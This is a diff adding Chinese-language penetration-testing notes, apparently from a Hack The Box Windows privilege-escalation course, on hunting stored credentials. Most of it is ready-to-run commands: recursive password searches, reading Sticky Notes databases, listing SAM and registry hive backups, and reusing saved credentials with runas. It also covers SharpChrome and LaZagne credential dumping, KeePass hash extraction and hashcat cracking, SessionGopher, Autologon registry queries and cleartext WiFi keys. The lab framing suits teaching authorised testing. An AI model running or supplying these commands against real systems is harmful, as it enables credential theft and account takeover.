@@ -1234,3 +1234,187 @@ Get-ChildItem -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml -ErrorAction Si
   ForEach-Object { "$($_.Path):$($_.LineNumber): $($_.Line.Trim())" }
 ```
 
+## 6.2 其他文件
+
+### 6.2.1手动在文件系统中搜索凭据
+
+```cmd-session
+cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
+```
+
+```cmd-session
+findstr /si password *.xml *.ini *.txt *.config
+```
+
+```cmd-session
+findstr /spin "password" *.*
+```
+
+```powershell-session
+select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
+```
+
+```cmd-session
+ dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+```
+
+```cmd-session
+where /R C:\ *.config
+```
+
+```powershell-session
+Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
+```
+
+### 6.2.2Sticky Notes Passwords
+
+这个文件位于， `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`
+
+我们可以把三个 `plum.sqlite*` 文件复制到系统，用 DB[ 浏览器等 SQLite](https://sqlitebrowser.org/dl/) 工具打开，通过查询`选择 Text from Note;` 查看 `Note 表中的 ``Text`` 列。
+
+这也可以用 [PowerShell 的 PSSQLite 模块](https://github.com/RamblingCookieMonster/PSSQLite)实现。首先，导入模块，指向一个数据源（这里指的是 StickNotes 应用使用的 SQLite 数据库文件），最后查询 `Note` 表，寻找任何有趣的数据。这也可以在我们的攻击机器下载 `.skite` 文件后完成，或者通过 WinRM 远程完成。
+
+```powershell-session
+Set-ExecutionPolicy Bypass -Scope Process
+cd .\PSSQLite\
+Import-Module .\PSSQLite.psd1
+$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
+Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
+```
+
+Strings to View DB File Contents 这取决于数据库大小，效率可能较低。
+
+```shell-session
+strings plum.sqlite-wal
+```
+
+### 6.2.3其他有趣的文件
+
+```shell-session
+%SYSTEMDRIVE%\pagefile.sys
+%WINDIR%\debug\NetSetup.log
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\iis6.log
+%WINDIR%\system32\config\AppEvent.Evt
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+%WINDIR%\system32\CCM\logs\*.log
+%USERPROFILE%\ntuser.dat
+%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
+%WINDIR%\System32\drivers\etc\hosts
+C:\ProgramData\Configs\*
+C:\Program Files\Windows PowerShell\*
+```
+
+## 6.3 进一步的凭证盗窃
+
+### 6.3.1Cmdkey Saved Credentials
+
+[cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) 命令可用于创建、列出和删除存储的用户名和密码。用户可能希望存储特定主机的凭据，或使用它来存储终端服务连接的凭据，以便使用远程桌面连接到远程主机，而无需输入密码。
+
+```cmd-session
+cmdkey /list
+```
+
+### 6.3.2以其他用户身份运行命令
+
+我们还可以尝试使用 `runas` 重用凭据，以该用户身份向自己发送反向 shell、运行二进制文件或使用以下命令启动 PowerShell 或 CMD 控制台：
+
+```powershell-session
+runas /savecred /user:inlanefreight\bob "COMMAND HERE"
+```
+
+### 6.3.3浏览器凭据
+
+用户通常会在浏览器中存储他们经常访问的应用程序的凭据。我们可以使用 [SharpChrome](https://github.com/GhostPack/SharpDPAPI) 等工具从 Google Chrome 检索 cookie 和保存的登录信息。
+
+```powershell-session
+PS C:\htb> .\SharpChrome.exe logins /unprotect
+```
+
+### 6.3.4密码管理器
+
+许多公司为用户提供密码管理器。这可能是桌面应用程序如 `KeePass`，云端解决方案如 `1Password`，或企业密码库如 `Thycotic` 或 `CyberArk`。
+
+如果我们在服务器、工作站或文件共享中发现 `.kdbx` 文件，我们就知道面对的是 `KeePass` 数据库，通常仅由主密码保护。如果我们能向攻击主机下载 `.kdbx` 文件，可以使用 [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) 等工具提取密码哈希值，并通过密码破解工具如 [Hashcat](https://github.com/hashcat) 或 [John the Ripper](https://github.com/openwall/john) 进行处理。
+
+提取 KeePass 哈希：
+
+```shell-session
+python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
+```
+
+离线破解哈希
+
+```shell-session
+hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+### 6.3.5电子邮件
+
+如果我们访问了拥有 Microsoft Exchange 收件箱的域名用户的域名加入系统，可以使用 [MailSniper](https://github.com/dafthack/MailSniper) 工具尝试搜索用户邮箱中的“pass”、“creds”、“credentials”等词汇。
+
+### 6.3.6More Fun with Credentials
+
+当一切都失败时，我们可以运行 [LaZagne](https://github.com/AlessandroZ/LaZagne) 工具，尝试从各种软件中获取凭证。这些软件包括网页浏览器、聊天客户端、数据库、电子邮件、内存转储、各种系统管理工具以及内部密码存储机制（如 Autologon、Credman、DPAPI、LSA 秘密等）。
+
+查看 LaZagne 帮助菜单：
+
+```powershell-session
+.\lazagne.exe -h
+```
+
+```powershell-session
+.\lazagne.exe all
+```
+
+我们可以使用 [SessionGopher](https://github.com/Arvanaghi/SessionGopher) 提取已保存的 PuTTY、WinSCP、FileZilla、SuperPuTTY 和 RDP 凭证。该工具用 PowerShell 编写，用于搜索和解密存储的登录信息，供远程访问工具使用。它可以本地运行，也可以远程运行。它会搜索所有登录过域加入（或独立）主机的用户 `HKEY_USERS` 蜂箱，并搜索并解密任何保存的会话信息。它也可以用于搜索 PuTTY 私钥文件（.ppk）、远程桌面（.rdp）和 RSA（.sdtid）文件。
+
+```powershell-session
+PS C:\htb> Import-Module .\SessionGopher.ps1
+ 
+PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
+```
+
+### 6.3.7注册表中的明文密码存储
+
+#### Autologon
+
+某些程序和 Windows 配置可能导致注册表中存储明文密码或其他数据。虽然 `Lazagne` 和 `SessionGopher` 等工具是提取凭据的好方法，但作为渗透测试人员，我们也应熟悉并熟悉手动枚举凭证。
+
+Windows [Autologon](https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon) 是一项功能，允许用户配置其 Windows 作系统自动登录特定用户账户，无需每次启动时手动输入用户名和密码。然而，一旦配置好，用户名和密码会以明文形式存储在注册表中。此功能通常用于单用户系统或在便利性大于安全性需求的情况下。
+
+```cmd-session
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+`AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
+
+`DefaultUserName` - Holds the value of the username of the account that will automatically log on.
+
+`DefaultPassword` - Holds the value of the password for the user account specified previously.
+
+#### Putty 
+
+```powershell-session
+reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
+```
+
+```powershell-session
+reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
+```
+
+### 6.3.8 WiFi密码
+
+```cmd-session
+netsh wlan show profile
+```
+
+```cmd-session
+netsh wlan show profile ilfreight_corp key=clear
+```
